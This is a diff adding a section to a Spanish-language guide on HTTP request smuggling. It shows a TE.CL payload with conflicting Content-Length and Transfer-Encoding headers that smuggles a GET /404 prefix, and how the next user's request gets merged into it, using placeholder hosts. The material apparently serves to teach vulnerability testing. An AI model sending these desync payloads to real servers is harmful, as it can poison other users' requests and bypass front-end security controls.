@@ -197,3 +197,43 @@ q=smuggling
 ```
 
 En el caso de que devuelva el 404 (o lo que se espera dependiendo del ataque) se puede confirmar la vulnerabilidad.
+
+> Nota: contrastar que gracias a Foo: x, la consulta es válida, ya que "borra" la parte superior de la siguiente consulta para reemplazarla por el 404.
+
+##### TE.CL
+
+```http
+POST /prueba HTTP/1.1
+Host: prueba.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: prueba.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+```
+
+Esto causará que la próxima consulta normal se vea así:
+
+```http
+GET /404 HTTP/1.1
+Host: prueba.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
